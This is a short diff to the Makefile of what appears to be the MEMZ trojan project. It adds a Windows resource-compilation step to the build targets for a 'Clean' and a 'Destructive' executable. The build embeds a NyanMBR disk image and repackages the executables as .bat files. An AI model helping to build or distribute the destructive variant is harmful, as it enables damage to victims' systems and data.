@@ -17,19 +17,24 @@ all: dir $(BUILDDIR)/MEMZ-Clean.bat $(BUILDDIR)/MEMZ-Destructive.bat
 
 dir: $(BUILDDIR)
 
+# sudo ln -s /usr/bin/x86_64-w64-mingw32-windres /usr/bin/windres
+
 $(BUILDDIR):
 	mkdir -p $(BUILDDIR)
 	
+$(BUILDDIR)/MEMZRES.o:
+	windres Data/MEMZ.rc $@
+
 $(BUILDDIR)/Data.c $(BUILDDIR)/Data.h: ../NyanMBR/disk.img $(DATA)
 	$(PYTHON) Data/genData.py $(BUILDDIR)/Data.c $(BUILDDIR)/Data.h
 	
-$(BUILDDIR)/MEMZ-Clean.exe: $(CFILES) $(HFILES) $(BUILDDIR)/Data.c $(BUILDDIR)/Data.h
+$(BUILDDIR)/MEMZ-Clean.exe: $(CFILES) $(HFILES) $(BUILDDIR)/Data.c $(BUILDDIR)/Data.h $(BUILDDIR)/MEMZRES.o
 	$(CC) $(CCFLAGS) $(CFILES) $(BUILDDIR)/Data.c $(LIBS) -o $@ -DCLEAN
 	
 $(BUILDDIR)/MEMZ-Clean.bat: $(BUILDDIR)/MEMZ-Clean.exe Source/exe2bat.py
 	$(PYTHON) Source/exe2bat.py $(BUILDDIR)/MEMZ-Clean.exe $@ MEMZ-Clean.exe -zip
 
-$(BUILDDIR)/MEMZ-Destructive.exe: $(CFILES) $(HFILES) $(BUILDDIR)/Data.c $(BUILDDIR)/Data.h
+$(BUILDDIR)/MEMZ-Destructive.exe: $(CFILES) $(HFILES) $(BUILDDIR)/Data.c $(BUILDDIR)/Data.h $(BUILDDIR)/MEMZRES.o
 	$(CC) $(CCFLAGS) $(CFILES) $(BUILDDIR)/Data.c $(LIBS) -o $@ -DDESTRUCTIVE
 	
 $(BUILDDIR)/MEMZ-Destructive.bat: $(BUILDDIR)/MEMZ-Destructive.exe Source/exe2bat.py
